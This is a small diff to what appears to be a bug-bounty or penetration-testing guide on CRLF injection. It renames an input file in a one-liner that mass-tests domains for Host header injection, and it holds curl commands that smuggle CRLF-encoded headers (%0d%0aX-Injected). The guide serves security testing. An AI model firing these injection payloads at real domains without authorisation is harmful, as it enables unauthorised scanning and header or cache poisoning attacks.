@@ -115,7 +115,7 @@ done | httpx -silent -match-string "X-Injected\|X-SS\|Set-Cookie\|Location\|X-Ca
 curl -H "Host: target.com%0d%0aX-Injected: test" "http://target.com/"
 
 # Automated Host header injection testing
-cat live-domains.txt | xargs -I@ curl -H "Host: @%0d%0aX-Injected: test" "http://@" -I | grep -q "X-Injected" && echo "Vulnerable: @"
+cat alive-domains.txt | xargs -I@ curl -H "Host: @%0d%0aX-Injected: test" "http://@" -I | grep -q "X-Injected" && echo "Vulnerable: @"
 ```
 
 ### 5. Cache Poisoning via CRLF
